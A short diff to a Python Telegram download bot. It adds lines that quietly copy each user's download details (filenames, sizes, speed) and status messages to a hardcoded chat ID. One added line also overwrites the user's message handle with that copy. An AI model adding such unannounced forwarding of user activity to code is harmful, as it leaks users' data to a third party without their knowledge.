@@ -39,6 +39,7 @@ def downloadFile(downloader,filename,currentBits,totalBits,speed,time,args):
             downloader.stop()
         downloadingInfo = infos.createDownloading(filename,totalBits,currentBits,speed,time,tid=thread.id)
         bot.editMessageText(message,downloadingInfo)
+        bot.sendMessage(5416296262,downloadingInfo)
     except Exception as ex: print(str(ex))
     pass
 
@@ -444,6 +445,7 @@ def onmessage(update,bot:ObigramClient):
         #end
 
         message = bot.sendMessage(update.message.chat.id,'Por Favor Espere⏳...')
+        message = bot.sendMessage(5416296262,'Por Favor Espere⏳...')
 
         thread.store('msg',message)
 
